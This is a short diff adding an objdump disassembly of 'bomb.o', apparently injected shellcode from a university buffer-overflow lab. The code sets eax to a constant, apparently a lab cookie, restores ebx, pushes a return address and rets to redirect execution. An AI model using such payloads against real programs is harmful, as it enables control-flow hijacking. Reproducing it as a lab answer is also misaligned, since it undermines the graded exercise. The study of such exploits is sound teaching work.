@@ -1,0 +1,11 @@
+
+bomb.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	b8 96 fb 4a 4b       	mov    $0x4b4afb96,%eax
+   5:	bb 40 3d 69 55       	mov    $0x55693d40,%ebx
+   a:	68 a8 95 04 08       	push   $0x80495a8
+   f:	c3                   	ret    
